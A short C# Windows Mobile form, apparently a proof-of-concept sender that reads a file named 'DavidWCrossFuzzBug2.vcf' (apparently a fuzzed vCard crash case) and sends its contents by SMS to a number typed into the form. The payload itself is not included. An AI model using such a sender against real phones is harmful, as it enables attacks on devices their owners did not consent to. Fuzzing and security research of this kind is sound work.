using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.IO;
using Microsoft.WindowsMobile.PocketOutlook.MessageInterception;
using Microsoft.WindowsMobile.PocketOutlook;

namespace Haxoring
{
    public partial class Form1 : Form
    {
        private MessageInterceptor interceptor;
        private OutlookSession os;

        public Form1()
        {
            InitializeComponent();

            // Set up SMS interception
            interceptor = new MessageInterceptor(InterceptionAction.Notify);
            interceptor.MessageReceived += new MessageInterceptorEventHandler(OnSMSReceived);
        }

        private void mmiLeft_Click(object sender, EventArgs e)
        {
            using (StreamReader sr = new StreamReader(@"\DavidWCrossFuzzBug2.vcf"))
            {
                SmsMessage msg = new SmsMessage(txtPhoneNumber.Text, sr.ReadToEnd());
                msg.Send();
            }
        }

        private void OnSMSReceived(object sender, MessageInterceptorEventArgs e)
        {
            SmsMessage msg = (SmsMessage)e.Message;
            
        }
    }
}